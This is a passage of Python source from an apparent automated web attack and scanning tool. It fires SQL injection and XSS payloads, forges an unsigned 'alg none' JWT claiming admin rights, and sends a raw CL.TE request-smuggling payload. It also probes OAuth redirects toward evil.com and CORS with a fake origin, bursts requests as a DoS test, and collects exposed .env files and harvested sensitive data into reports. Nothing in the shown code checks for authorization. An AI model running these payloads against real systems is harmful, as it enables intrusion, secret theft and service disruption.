                            timeout=180)
                        if r.status_code == 200:
                            try:
                                content = r.json()['choices'][0]['message']['content']
                                Console().print(f"[green]✓ AI success: {model}[/green]")
                                return content, model
                            except Exception: pass
                        else:
                            Console().print(f"[yellow]AI {model} status {r.status_code}[/yellow]")
                    except Exception as e:
                        Console().print(f"[yellow]AI {model} err: {str(e)[:80]}[/yellow]")
                        time.sleep(2)
        return "AI Analysis failed (all keys/models exhausted).", ""

    # ============================================================
    # PDF REPORT
    # ============================================================
    def _generate_pdf(self, results, output_path="report.pdf"):
        try:
            class PDF(FPDF):
                def header(self):
                    self.set_font('Arial','B',16)
                    self.cell(0,10,f'{TOOLS_NAME} v{TOOLS_VERSION} - Report',ln=True,align='C')
                    self.ln(5)
                def footer(self):
                    self.set_y(-15); self.set_font('Arial','I',8)
                    self.cell(0,10,f'Page {self.page_no()}',align='C')

            pdf = PDF(); pdf.add_page(); pdf.set_font('Arial','',11)
            pdf.cell(0,8,f'Target: {results["target"]}',ln=True)
            pdf.cell(0,8,f'Category: {results.get("domain_category","N/A")} / {results.get("domain_subcategory","")}',ln=True)
            region = results.get("region", {})
            pdf.cell(0,8,f'Region: {region.get("country","N/A")} | City: {region.get("city","")} | ISP: {region.get("isp","")}',ln=True)
            pdf.cell(0,8,f'Server IP: {results.get("server_ip","N/A")}',ln=True)
            pdf.cell(0,8,f'Time: {results["timestamp"]}',ln=True)
            pdf.cell(0,8,f'Duration: {results["scan_duration"]:.2f}s',ln=True)
            pdf.cell(0,8,f'AI Model: {results.get("ai_model_used","N/A")}',ln=True)
            pdf.ln(3)
            pdf.set_font('Arial','B',13); pdf.cell(0,8,'Summary',ln=True)
            pdf.set_font('Arial','',11); s = results["summary"]
            pdf.cell(0,8,
                f'Total: {s["total"]} | Critical: {s["critical"]} | High: {s["high"]} | '
                f'Medium: {s["medium"]} | Low: {s["low"]}',ln=True)
            pdf.ln(3)

            if results.get("env_files_found"):
                pdf.set_font('Arial','B',13); pdf.cell(0,8,'ENV Files Found (CRITICAL)',ln=True)
                pdf.set_font('Arial','',9)
                for e in results["env_files_found"][:10]:
                    pdf.multi_cell(0,5, f"  URL: {e['url']}\n  Size: {e['content_size']} bytes | Keys: {e.get('total_keys',0)}\n  Saved: {e.get('save_path','')}")
                pdf.ln(2)

            if results.get("config_files_found"):
                pdf.set_font('Arial','B',13); pdf.cell(0,8,'Config Files Found',ln=True)
                pdf.set_font('Arial','',9)
                for c in results["config_files_found"][:10]:
                    pdf.multi_cell(0,5, f"  URL: {c['url']}\n  Size: {c['content_size']} bytes")
                pdf.ln(2)

            pdf.set_font('Arial','B',13); pdf.cell(0,8,'Vulnerabilities',ln=True)
            pdf.set_font('Arial','',9)
            for vt, vs in results["vulnerabilities"].items():
                if vs:
                    pdf.set_font('Arial','B',10)
                    pdf.cell(0,6,f'[{vt}] {len(vs)} finding(s)',ln=True)
                    pdf.set_font('Arial','',8)
                    for v in vs[:3]:
                        pdf.multi_cell(0,5,
                            f"  Param: {v.get('param','N/A')} | "
                            f"Payload: {str(v.get('payload','N/A'))[:50]} | "
                            f"Risk: {v.get('risk')}")
                    pdf.ln(1)
            pdf.add_page(); pdf.set_font('Arial','B',13); pdf.cell(0,8,'Sensitive Data',ln=True)
            pdf.set_font('Arial','',9)
            for k, v in results["sensitive_data"].items():
                if v:
                    pdf.multi_cell(0,5, f'{k.upper()}: {", ".join(str(x) for x in v[:10])}')

            if results.get("ai_analysis"):
                pdf.add_page(); pdf.set_font('Arial','B',13); pdf.cell(0,8,'AI Analysis',ln=True)
                pdf.set_font('Arial','',9)
                pdf.multi_cell(0,6,
                    results["ai_analysis"].replace('**','').replace('###','>>>')[:8000])
            pdf.output(output_path)
            Console().print(f"[green]PDF: {os.path.abspath(output_path)}[/green]")
        except Exception as e:
            Console().print(f"[yellow]PDF generation error: {e}[/yellow]")

    def _save_sensitive_data(self, all_s):
        combined = {}
        for s in all_s:
            for k, v in s.items():
                combined.setdefault(k, []).extend(v)
        ts = int(time.time())
        for k, v in combined.items():
            if v:
                uniq = list(set(str(x) for x in v if x))
                if uniq:
                    fn = os.path.join(self.sensitive_folder, f"{k}_{ts}.txt")
                    with open(fn, 'w', encoding='utf-8') as f:
                        f.write('\n'.join(uniq))
                    self.results_scan["sensitive_data"][k] = uniq[:30]

    def _generate_sensitive_pdf(self, data_type, data_list, target, output_dir):
        if not data_list: return None
        try:
            class PDF(FPDF):
                def header(self):
                    self.set_font('Arial','B',14)
                    self.cell(0,10,f'{data_type.upper()} - {TOOLS_NAME}',ln=True,align='C')
                    self.ln(3)
                def footer(self):
                    self.set_y(-15); self.set_font('Arial','I',8)
                    self.cell(0,10,f'Target: {target}',align='C')

            pdf = PDF(); pdf.add_page(); pdf.set_font('Arial','',11)
            pdf.cell(0,8,f'Target: {target}',ln=True)
            pdf.cell(0,8,f'Data Type: {data_type.upper()}',ln=True)
            pdf.cell(0,8,f'Total: {len(data_list)}',ln=True)
            pdf.ln(5); pdf.set_font('Arial','B',12); pdf.cell(0,8,'DATA:',ln=True)
            pdf.set_font('Arial','',9)
            for i, item in enumerate(data_list[:500],1):
                txt = json.dumps(item, ensure_ascii=False) if isinstance(item, dict) else str(item)
                pdf.multi_cell(0,5, f'{i}. {txt[:300]}')
            os.makedirs(output_dir, exist_ok=True)
            filename = os.path.join(output_dir, f'{data_type}_{int(time.time())}.pdf')
            pdf.output(filename)
            Console().print(f"[green]✓ PDF {data_type}: {os.path.abspath(filename)}[/green]")
            return filename
        except Exception as e:
            Console().print(f"[yellow]Sensitive PDF error: {e}[/yellow]")
            return None

    def _generate_all_sensitive_pdfs(self, sensitive_data, target):
        pdf_dir = os.path.join(self.sensitive_folder, "pdfs")
        os.makedirs(pdf_dir, exist_ok=True)
        pdfs = []
        for key, values in sensitive_data.items():
            if values and isinstance(values, list) and len(values) > 0:
                fp = self._generate_sensitive_pdf(key, values, target, pdf_dir)
                if fp: pdfs.append(fp)
        self.results_scan["sensitive_pdfs"] = pdfs

    # ============================================================
    # INTERNAL CHECKS
    # ============================================================
    def _check_robots(self, target):
        findings = []
        try:
            url = target.rstrip('/') + '/robots.txt'
            resp = self._smart_request(url, timeout=6)
            if resp and resp.status_code == 200 and 'Disallow' in (resp.text or ''):
                dis = re.findall(r'Disallow:\s*(\S+)', resp.text)[:10]
                findings.append({
                    "type": "Robots.txt Found", "param": "N/A", "payload": "N/A",
                    "evidence": f"Disallowed: {', '.join(dis)}", "risk": "LOW", "confidence": 90,
                    "poc": {"url": url, "curl": f'curl -k "{url}"',
                             "response": resp.text[:400], "statusCode": resp.status_code,
                             "timeDiff": "N/A", "verified": True}
                })
        except: pass
        return findings

    def _check_sitemap(self, target):
        findings = []
        try:
            url = target.rstrip('/') + '/sitemap.xml'
            resp = self._smart_request(url, timeout=6)
            if resp and resp.status_code == 200 and \
               ('<urlset' in (resp.text or '') or '<sitemapindex' in (resp.text or '')):
                findings.append({
                    "type": "Sitemap Found", "param": "N/A", "payload": "N/A",
                    "evidence": "Sitemap.xml accessible", "risk": "INFO", "confidence": 90,
                    "poc": {"url": url, "curl": f'curl -k "{url}"',
                             "response": resp.text[:300], "statusCode": resp.status_code,
                             "timeDiff": "N/A", "verified": True}
                })
        except: pass
        return findings

    def _check_dir_enum(self, target):
        findings = []
        dirs = ["/admin", "/login", "/dashboard", "/wp-admin/", "/wp-login.php",
                "/phpinfo.php", "/api", "/.git/HEAD", "/config.php"]
        base = target.rstrip('/')

        def check(d):
            try:
                url = base + d
                resp = self._smart_request(url, timeout=6)
                if resp and resp.status_code in (200, 301, 302, 401, 403):
                    return {
                        "type": f"Dir/File: {d}", "param": "N/A", "payload": "N/A",
                        "evidence": f"Status {resp.status_code}",
                        "risk": "MEDIUM" if resp.status_code in (200, 401, 403) else "INFO",
                        "confidence": 85,
                        "poc": {"url": url, "curl": f'curl -k -i "{url}"',
                                 "response": (resp.text or "")[:200],
                                 "statusCode": resp.status_code,
                                 "timeDiff": "N/A",
                                 "verified": self._verify_poc(url, resp.text or "", 2)}
                    }
            except: return None
            return None

        with ThreadPoolExecutor(max_workers=self.threads) as ex:
            for r in ex.map(check, dirs):
                if r: findings.append(r)
        return findings

    def _check_security_headers(self, target):
        findings = []
        required = ["Strict-Transport-Security","Content-Security-Policy","X-Frame-Options",
                    "X-Content-Type-Options","Referrer-Policy","Permissions-Policy"]
        resp = self._smart_request(target, timeout=8)
        if not resp: return findings
        missing = [h for h in required if h not in resp.headers]
        if missing:
            findings.append({
                "type": "Missing Security Headers", "param": "N/A", "payload": "N/A",
                "evidence": f"Missing: {', '.join(missing)}", "risk": "LOW", "confidence": 90,
                "poc": {"url": target, "curl": f'curl -I "{target}"',
                         "response": str(resp.headers), "statusCode": resp.status_code,
                         "timeDiff": "N/A", "verified": True}
            })
        return findings

    def _check_waf(self, target):
        findings = []
        resp = self._smart_request(target, timeout=8)
        if not resp: return findings
        waf_signs = [("Cloudflare",["cf-ray"]),("Akamai",["akamai","x-akamai"]),
                     ("Sucuri",["x-sucuri-id"]),("Imperva",["incap_ses"]),
                     ("Fastly",["fastly"]),("Varnish",["x-varnish"]),
                     ("AWS/CloudFront",["x-amz-cf-id"])]
        hlower = "\n".join([f"{k.lower()}: {str(v).lower()}" for k, v in resp.headers.items()])
        detected = []
        for name, keys in waf_signs:
            for k in keys:
                if k.lower() in hlower:
                    detected.append(name); break
        if detected:
            findings.append({
                "type": "WAF/CDN Detected", "param": "N/A", "payload": "N/A",
                "evidence": f"Detected: {', '.join(detected)}", "risk": "INFO", "confidence": 95,
                "poc": {"url": target, "curl": f'curl -I "{target}"',
                         "response": str(resp.headers), "statusCode": resp.status_code,
                         "timeDiff": "N/A", "verified": True}
            })
        return findings

    def _check_cors(self, target):
        findings = []
        test_origin = "https://evil.example"
        resp = self._smart_request(target, timeout=8, headers={"Origin": test_origin})
        if not resp: return findings
        acao = resp.headers.get("Access-Control-Allow-Origin")
        acac = resp.headers.get("Access-Control-Allow-Credentials")
        if acao == "*":
            findings.append({
                "type": "CORS Wildcard", "param": "N/A", "payload": "N/A",
                "evidence": "ACAO: *", "risk": "MEDIUM", "confidence": 90,
                "poc": {"url": target, "curl": f'curl -H "Origin: {test_origin}" "{target}"',
                         "response": str(resp.headers), "statusCode": resp.status_code,
                         "timeDiff": "N/A", "verified": True}
            })
        if acao == test_origin and acac and acac.lower() == "true":
            findings.append({
                "type": "CORS Reflect + Credentials", "param": "N/A", "payload": "N/A",
                "evidence": f"Origin reflected: {acao}", "risk": "HIGH", "confidence": 95,
                "poc": {"url": target, "curl": f'curl -H "Origin: {test_origin}" "{target}"',
                         "response": str(resp.headers), "statusCode": resp.status_code,
                         "timeDiff": "N/A", "verified": True}
            })
        return findings

    def _check_open_redirect(self, target):
        findings = []
        p = urlsplit(target); base = urlunsplit((p.scheme,p.netloc,p.path,"",""))
        params = parse_qs(p.query)
        if not params: return findings
        keys = ["next","url","return","redirect","dest","goto"]
        for k in params.keys():
            if k.lower() in keys:
                test_url = base + "?" + urlencode([(k,"http://example.com")])
                resp = self._smart_request(test_url, timeout=6, allow_redirects=False)
                if resp and resp.status_code in (301,302,303,307,308):
                    loc = resp.headers.get("Location","")
                    if loc.startswith("http://example.com"):
                        findings.append({
                            "type": "Open Redirect", "param": k,
                            "payload": "http://example.com",
                            "evidence": f"Redirect to {loc}", "risk": "MEDIUM", "confidence": 90,
                            "poc": {"url": test_url, "curl": f'curl -k -i "{test_url}"',
                                     "response": str(resp.headers),
                                     "statusCode": resp.status_code,
                                     "timeDiff": "N/A", "verified": True}
                        })
        return findings

    def _check_ssl_info(self, target):
        findings = []
        try:
            domain = urlparse(target).netloc.split(':')[0]
            ctx = ssl.create_default_context()
            with socket.create_connection((domain,443), timeout=5) as sock:
                with ctx.wrap_socket(sock, server_hostname=domain) as ssock:
                    cert = ssock.getpeercert()
                    if cert:
                        findings.append({
                            "type": "SSL Certificate Info", "param": "N/A", "payload": "N/A",
                            "evidence": f"Subject: {cert.get('subject')}", "risk": "INFO",
                            "confidence": 100,
                            "poc": {"url": target,
                                     "curl": f"openssl s_client -connect {domain}:443",
                                     "response": str(cert)[:500],
                                     "statusCode": 200, "timeDiff": "N/A", "verified": True}
                        })
        except: pass
        return findings

    def _check_cookie_flags(self, target):
        findings = []
        resp = self._smart_request(target, timeout=8)
        if not resp: return findings
        cookies = resp.headers.get('Set-Cookie','')
        if cookies:
            flags = []
            if 'Secure' not in cookies: flags.append('Secure')
            if 'HttpOnly' not in cookies: flags.append('HttpOnly')
            if 'SameSite' not in cookies: flags.append('SameSite')
            if flags:
                findings.append({
                    "type": "Insecure Cookie Flags", "param": "N/A", "payload": "N/A",
                    "evidence": f"Missing: {', '.join(flags)}", "risk": "MEDIUM", "confidence": 85,
                    "poc": {"url": target, "curl": f'curl -I "{target}"',
                             "response": cookies, "statusCode": resp.status_code,
                             "timeDiff": "N/A", "verified": True}
                })
        return findings

    def _check_rate_limit(self, target):
        findings = []
        success = 0
        for _ in range(10):
            r = self._smart_request(target, timeout=4)
            if r and r.status_code < 400: success += 1
        if success >= 8:
            findings.append({
                "type": "No Rate Limit", "param": "N/A", "payload": "N/A",
                "evidence": f"{success}/10 succeeded", "risk": "MEDIUM", "confidence": 80,
                "poc": {"url": target,
                         "curl": f'for i in {{1..10}}; do curl -s "{target}"; done',
                         "response": f"{success} succeeded", "statusCode": 200,
                         "timeDiff": "N/A", "verified": True}
            })
        return findings

    def _check_csrf(self, target, forms):
        findings = []
        for form in forms:
            if form.get('method') == 'POST':
                has_token = any(any(x in i['name'].lower() for x in
                                     ['csrf','xsrf','token','authenticity'])
                                 for i in form.get('inputs', []))
                if not has_token:
                    findings.append({
                        "type": "CSRF Token Missing", "param": "N/A", "payload": "N/A",
                        "evidence": f"POST form at {form['url']}", "risk": "MEDIUM",
                        "confidence": 85,
                        "poc": {"url": form['url'], "curl": f'curl -X POST "{form["url"]}"',
                                 "response": "No CSRF token", "statusCode": 200,
                                 "timeDiff": "N/A", "verified": True}
                    })
        return findings

    def _check_wp_activity_log(self, target):
        findings = []
        try:
            if not target.startswith(('http://','https://')): target = 'https://' + target
            target = target.rstrip('/')
            wp = self._smart_request(f"{target}/wp-login.php", timeout=8)
            if not wp or 'wp-submit' not in (wp.text or ''):
                wp = self._smart_request(f"{target}/wp-admin/", timeout=8)
                if not wp or 'wp-login' not in (wp.text or '').lower(): return findings
            readme = self._smart_request(
                f"{target}/wp-content/plugins/wp-security-audit-log/readme.txt", timeout=5)
            if not readme or 'WP Activity Log' not in (readme.text or ''): return findings
            vm = re.search(r"Stable tag:\s*([\d.]+)", readme.text)
            if vm and vm.group(1) <= "5.6.3.1":
                findings.append({
                    "type": "WP Activity Log RCE (CVE-2026-54806)",
                    "param": "User-Agent",
                    "payload": 'O:13:"WP_HTML_Token":...',
                    "evidence": f"Vuln: {vm.group(1)}", "risk": "CRITICAL", "confidence": 95,
                    "poc": {"url": f"{target}/wp-login.php", "curl": "curl -X POST ...",
                             "response": "Vulnerable", "statusCode": 200,
                             "timeDiff": "N/A", "verified": True},
                    "version": vm.group(1)
                })
        except: pass
        return findings

    def _check_deface_advanced(self, target):
        findings = []
        try:
            resp = self._smart_request(target, timeout=8)
            if not resp: return findings
            html_lower = (resp.text or "").lower()
            title_m = re.search(r'<title>(.*?)</title>', resp.text or "", re.I)
            title = title_m.group(1) if title_m else 'No Title'
            indicators = ['hacked','defaced','hacked by','owned by','h4ck3d','pwned','0wn3d',
                          'cyber army','anonymous','ghost team','lulzsec','diretas oleh','di hack oleh']
            found = [i for i in indicators if i in html_lower]
            suspicious = len(re.findall(r'<marquee|<blink', html_lower))
            if found or suspicious >= 3:
                findings.append({
                    "type": "Deface Detection", "param": "N/A", "payload": "N/A",
                    "evidence": f"Indicators: {', '.join(found) if found else 'Suspicious pattern'}",
                    "risk": "CRITICAL", "confidence": 95,
                    "poc": {"url": target, "curl": f'curl -k "{target}"',
                             "response": (resp.text or "")[:400],
                             "statusCode": resp.status_code,
                             "timeDiff": "N/A",
                             "verified": self._verify_poc(target, resp.text or "", 2)},
                    "title": title, "indicators": found
                })
        except: pass
        return findings

    def _check_jwt_attack(self, target):
        findings = []
        try:
            resp = self._smart_request(target, timeout=8)
            if not resp: return findings
            jwt_pattern = r'eyJ[A-Za-z0-9_\-]+\.eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+'
            cookies = resp.headers.get('Set-Cookie','')
            tokens = re.findall(jwt_pattern, cookies) + re.findall(jwt_pattern, resp.text or "")
            for t in set(tokens[:3]):
                none_header = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').decode().rstrip('=')
                none_payload = base64.urlsafe_b64encode(b'{"admin":true,"role":"admin"}').decode().rstrip('=')
                none_jwt = f"{none_header}.{none_payload}."
                findings.append({
                    "type": "JWT Algorithm None Attack", "param": "Authorization",
                    "payload": none_jwt[:100],
                    "evidence": "Found JWT - try none algorithm",
                    "risk": "HIGH", "confidence": 60,
                    "poc": {"url": target,
                             "curl": f'curl -H "Authorization: Bearer {none_jwt}" "{target}"',
                             "response": "Testing none algorithm", "statusCode": 200,
                             "timeDiff": "N/A", "verified": False}
                })
        except: pass
        return findings

    def _check_http_smuggling(self, target):
        findings = []
        try:
            p = urlparse(target); host = p.hostname
            port = p.port or (443 if p.scheme == 'https' else 80)
            payload = (b"POST / HTTP/1.1\r\nHost: " + host.encode() +
                       b"\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG")
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(6)
            if p.scheme == 'https':
                ctx = ssl.create_default_context()
                ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=host)
            s.connect((host, port)); s.send(payload)
            resp = s.recv(4096).decode('utf-8', errors='ignore'); s.close()
            if '400' not in resp[:20] and 'HTTP/1.1' in resp[:50]:
                findings.append({
                    "type": "HTTP Request Smuggling (CL.TE)", "param": "N/A",
                    "payload": "CL:6/TE:chunked",
                    "evidence": "Server accepted ambiguous request", "risk": "HIGH",
                    "confidence": 50,
                    "poc": {"url": target, "curl": f"nc {host} {port}",
                             "response": resp[:300], "statusCode": 200,
                             "timeDiff": "N/A", "verified": False}
                })
        except: pass
        return findings

    def _check_subdomain_takeover(self, subs):
        findings = []
        sigs = {'github.io': "There isn't a GitHub Pages site here",
                'herokuapp.com': 'No such app',
                's3.amazonaws.com': 'NoSuchBucket',
                'azurewebsites.net': '404 Web Site not found',
                'cloudfront.net': 'Bad request',
                'fastly.net': 'Fastly error: unknown domain'}
        for sub in subs[:20]:
            try:
                resp = self._smart_request(f"http://{sub}", timeout=8)
                if resp:
                    body = (resp.text or "").lower()
                    for svc, sig in sigs.items():
                        if svc in body or sig.lower() in body:
                            findings.append({
                                "type": "Subdomain Takeover", "param": sub, "payload": svc,
                                "evidence": f"Takeover possible: {svc}", "risk": "CRITICAL",
                                "confidence": 85,
                                "poc": {"url": f"http://{sub}", "curl": f'curl -k "{sub}"',
                                         "response": (resp.text or "")[:300],
                                         "statusCode": resp.status_code,
                                         "timeDiff": "N/A", "verified": True}
                            })
                            break
            except: pass
        return findings

    def _check_graphql(self, target):
        findings = []
        endpoints = ['/graphql','/api/graphql','/v1/graphql','/graphiql','/query']
        base = target.rstrip('/')
        for ep in endpoints:
            try:
                url = base + ep
                q = {"query": "{__schema{types{name}}}"}
                resp = self._smart_request(url, timeout=8, method='POST',
                                            data=json.dumps(q),
                                            headers={'Content-Type': 'application/json'})
                if resp and resp.status_code == 200 and '__schema' in (resp.text or ""):
                    findings.append({
                        "type": "GraphQL Introspection Enabled", "param": ep,
                        "payload": "{__schema{types{name}}}",
                        "evidence": "GraphQL schema exposed", "risk": "MEDIUM", "confidence": 95,
                        "poc": {"url": url,
                                 "curl": f'curl -X POST "{url}" -d \'{json.dumps(q)}\'',
                                 "response": (resp.text or "")[:400],
                                 "statusCode": resp.status_code,
                                 "timeDiff": "N/A", "verified": True}
                    })
                    break
            except: pass
        return findings

    def _check_oauth_bypass(self, target):
        findings = []
        try:
            resp = self._smart_request(target, timeout=8)
            if not resp: return findings
            links = re.findall(r'href=["\']([^"\']*(?:oauth|authorize|redirect_uri)[^"\']*)["\']',
                               resp.text or "", re.I)
            for link in links[:3]:
                full = urljoin(target, link)
                if 'redirect_uri' in full:
                    findings.append({
                        "type": "OAuth redirect_uri Manipulation", "param": "redirect_uri",
                        "payload": "https://evil.com",
                        "evidence": "Test OAuth redirect manipulation", "risk": "HIGH",
                        "confidence": 60,
                        "poc": {"url": full, "curl": f'curl -k "{full}"',
                                 "response": "Testing redirect", "statusCode": 302,
                                 "timeDiff": "N/A", "verified": False}
                    })
                    break
        except: pass
        return findings

    def _check_ddos_vulnerability(self, target):
        findings = []
        try:
            baseline = []
            for _ in range(4):
                t0 = time.time()
                r = self._smart_request(target, timeout=8)
                if r: baseline.append(time.time() - t0)
            if not baseline: return findings
            base_avg = sum(baseline) / len(baseline)

            burst_times = []
            for _ in range(20):
                t0 = time.time()
                r = self._smart_request(target, timeout=5)
                if r: burst_times.append(time.time() - t0)
            if not burst_times: return findings
            burst_avg = sum(burst_times) / len(burst_times)
            degradation = burst_avg / base_avg if base_avg > 0 else 1.0

            h_resp = self._smart_request(target, timeout=8)
            headers = dict(h_resp.headers) if h_resp else {}
            waf = None
            for name, keys in [("Cloudflare",["cf-ray"]),("Akamai",["akamai"]),
                                ("Sucuri",["x-sucuri-id"]),("Imperva",["incap_ses"]),
                                ("AWS CloudFront",["x-amz-cf-id"]),("Fastly",["fastly"])]:
                if any(k in "\n".join(f"{a}: {b}" for a, b in headers.items()).lower()
                       for k in keys):
                    waf = name; break

            score = 0
            if not waf: score += 3
            if degradation < 1.5: score += 3
            if degradation >= 3: score -= 2
            risk = ("CRITICAL" if score >= 5 else "HIGH" if score >= 3
                    else "MEDIUM" if score >= 1 else "LOW")
            findings.append({
                "type": "DDoS/DoS Assessment", "param": "N/A", "payload": "20-req burst",
                "evidence": f"Baseline {base_avg:.2f}s → Burst {burst_avg:.2f}s "
                            f"(x{degradation:.2f}) | WAF: {waf or 'NONE'}",
                "risk": risk, "confidence": 88,
                "poc": {"url": target,
                         "curl": f"for i in $(seq 1 20); do curl -k -o /dev/null -s -w '%{{time_total}}\\n' \"{target}\"; done",
                         "response": f"base {base_avg:.3f}s burst {burst_avg:.3f}s",
                         "statusCode": 200, "timeDiff": f"{burst_avg:.3f}s",
                         "verified": True},
                "waf": waf, "degradation": round(degradation, 2)
            })
        except: pass
        return findings

    # ============================================================
    # SQL / XSS
    # ============================================================
    def _check_sql(self, target, param, value, payload):
        try:
            url = build_url(target, param, payload)
            t0 = time.time()
            resp = self._smart_request(url, timeout=6)
            elapsed = time.time() - t0
            if not resp: return None
            poc = {
                "url": url, "curl": f'curl -k -i "{url}"',
                "response": (resp.text or "")[:300],
                "statusCode": resp.status_code,
                "timeDiff": f"{elapsed:.2f}s",
                "verified": self._verify_poc(url, resp.text or "", 2),
                "payload": payload
            }
            if re.search(r'(mysql|sql|syntax|error|ora-|postgres|sqlite|SQLSTATE)',
                         resp.text or "", re.I):
                return {"type": "SQL Injection (Error)", "param": param,
                        "payload": payload[:100], "evidence": "DB error",
                        "risk": "CRITICAL", "confidence": 95, "poc": poc}
            if any(x in payload for x in ['SLEEP','WAITFOR']) and elapsed > 3:
                return {"type": "SQL Injection (Time)", "param": param,
                        "payload": payload[:100], "evidence": f"Delay {elapsed:.1f}s",
                        "risk": "CRITICAL", "confidence": 85, "poc": poc}
        except: pass
        return None

    def _scan_sql(self, target, params):
        results = []
        bases = ["' OR '1'='1","' OR 1=1--","' OR 1=1#","1' AND '1'='1",
                 "' UNION SELECT NULL--","' AND SLEEP(3)--"]
        payloads = bases[:]
        for p in bases:
            payloads.append(urllib.parse.quote(p))
            payloads.append(p.upper())
        tasks = [(param, value, payload)
                 for param, value in params.items()
                 for payload in payloads[:8]]
        if not tasks: return results
        console = Console()
        with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"),
                      BarColumn(), TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
                      TimeElapsedColumn(), console=console) as progress:
            task = progress.add_task("[red]SQL Injection", total=len(tasks))
            with ThreadPoolExecutor(max_workers=self.threads) as ex:
                futures = [ex.submit(self._check_sql, target, p, v, pl)
                           for p, v, pl in tasks]
                for f in as_completed(futures):
                    r = f.result()
                    if r: results.append(r)
                    progress.update(task, advance=1)
        return results

    def _check_xss(self, target, param, value, payload):
        try:
            url = build_url(target, param, payload)
            resp = self._smart_request(url, timeout=6)
            if not resp: return None
            if payload not in (resp.text or ""): return None
            return {
                "type": "XSS (Reflected)", "param": param, "payload": payload[:100],
                "evidence": "Payload reflected", "risk": "HIGH", "confidence": 85,
                "poc": {"url": url, "curl": f'curl -k -i "{url}"',
                         "response": (resp.text or "")[:300],
                         "statusCode": resp.status_code,
                         "timeDiff": "N/A",
                         "verified": self._verify_poc(url, resp.text or "", 2)}
            }
        except: return None

    def _scan_xss(self, target, params):
        results = []
        payloads = ['<script>alert(1)</script>', '<svg onload=alert(1)>',
                    '<img src=x onerror=alert(1)>', '" onmouseover=alert(1) "',
                    "'><script>alert(1)</script>", 'javascript:alert(1)']
        tasks = [(p, v, pl) for p, v in params.items() for pl in payloads]
        if not tasks: return results
        console = Console()
        with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"),
                      BarColumn(), TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
                      TimeElapsedColumn(), console=console) as progress:
            task = progress.add_task("[cyan]XSS", total=len(tasks))
            with ThreadPoolExecutor(max_workers=self.threads) as ex:
                futures = [ex.submit(self._check_xss, target, p, v, pl)
                           for p, v, pl in tasks]
                for f in as_completed(futures):
                    r = f.result()
                    if r: results.append(r)
                    progress.update(task, advance=1)
        return results

    def _check_dom_xss(self, html, url):
        findings = []
        for script in re.findall(r'<script[^>]*>(.*?)</script>', html or "", re.I | re.S):
            for sink in ['document.write','innerHTML','eval(','setTimeout(','location=']:
                if sink in script:
                    findings.append({
                        "type": "DOM XSS Sink", "param": "N/A", "payload": sink,
                        "evidence": f"Sink: {sink}", "risk": "HIGH", "confidence": 60,
                        "poc": {"url": url, "curl": f'curl -k "{url}"',
                                 "response": sink, "statusCode": 200,
                                 "timeDiff": "N/A", "verified": True}
                    })
                    break
        return findings

    # ============================================================
    # USER-SCANNER OSINT
    # ============================================================
    def _run_user_scanner(self, email):
        findings = []
        if not is_tool_available('user-scanner'): return findings
        try:
            Console().print(f"[cyan]🔥 user-scanner OSINT: {email}[/cyan]")
            cmd = ['user-scanner', '-e', email, '--only-found', '-v']
            proc = subprocess.run(cmd, capture_output=True, timeout=90, text=True,
                                   encoding='utf-8', errors='ignore')
            output = proc.stdout or proc.stderr or ""
            if output.strip():
                findings.append({
                    "type": "Email OSINT (user-scanner)", "param": "email",
                    "payload": email, "evidence": output[:800], "risk": "INFO",
                    "confidence": 90,
                    "poc": {"url": "https://github.com/kaifcodec/user-scanner",
                             "curl": f"user-scanner -e {email} --only-found",
                             "response": output[:400], "statusCode": 200,
                             "timeDiff": "N/A", "verified": True}
                })
                Console().print(f"[green]✓ user-scanner OK: {email}[/green]")
        except Exception as e:
            Console().print(f"[yellow]user-scanner error: {str(e)[:80]}[/yellow]")
        return findings

    # ============================================================
    # EXTERNAL TOOLS
    # ============================================================
    def _run_external_tool(self, cmd, timeout=240):
        try:
            r = subprocess.run(cmd, capture_output=True, timeout=timeout, text=True,
                                encoding='utf-8', errors='ignore')
            return r.stdout or "" if r.returncode == 0 or r.stdout else r.stderr or ""
        except: return ""

    def _run_nuclei(self, target):
        findings = []
        if not is_tool_available('nuclei'): return findings
        Console().print("[cyan]🔥 Nuclei...[/cyan]")
        out = self._run_external_tool(
            ['nuclei','-u',target,'-severity','critical,high,medium','-silent','-jsonl',
             '-timeout','8'], timeout=300)
        for line in out.strip().split('\n'):
            if not line.strip(): continue
            try:
                data = json.loads(line)
                findings.append({
                    "type": f"Nuclei: {data.get('info',{}).get('name','Unknown')}",
                    "param": "N/A", "payload": data.get('matched-at','N/A'),
                    "evidence": data.get('info',{}).get('description','Nuclei')[:200],
                    "risk": data.get('info',{}).get('severity','MEDIUM').upper(),
                    "confidence": 90,
                    "poc": {"url": data.get('matched-at', target),
                             "curl": data.get('curl-command', f'curl -k "{target}"'),
                             "response": str(data.get('extracted-results',''))[:300],
                             "statusCode": 200, "timeDiff": "N/A", "verified": True}
                })
            except: continue
        Console().print(f"[green]✓ Nuclei: {len(findings)}[/green]")
        return findings

    def _run_subfinder(self, domain):
        if not is_tool_available('subfinder'): return []
        Console().print("[cyan]🔥 Subfinder...[/cyan]")
        out = self._run_external_tool(['subfinder','-d',domain,'-silent'], timeout=90)
        subs = [l.strip() for l in out.strip().split('\n') if l.strip()]
        Console().print(f"[green]✓ Subfinder: {len(subs)}[/green]")
        return subs

    def _run_katana(self, target):
        if not is_tool_available('katana'): return []
        Console().print("[cyan]🔥 Katana...[/cyan]")
        out = self._run_external_tool(
            ['katana','-u',target,'-silent','-d','1','-jc'], timeout=120)
        urls = [l.strip() for l in out.strip().split('\n') if l.strip()]
        Console().print(f"[green]✓ Katana: {len(urls)}[/green]")
        return urls

    def _run_nmap(self, target):
        findings = []
        if not is_tool_available('nmap'): return findings
        Console().print("[cyan]🔥 Nmap...[/cyan]")
        try:
            domain = urlparse(target).netloc.split(':')[0]
            out = self._run_external_tool(
                ['nmap','-sV','-T4','--top-ports','100','-oX','-',domain], timeout=300)
            if out:
                import xml.etree.ElementTree as ET
                xs = out.find('<?xml')
                if xs >= 0:
                    try:
                        root = ET.fromstring(out[xs:])
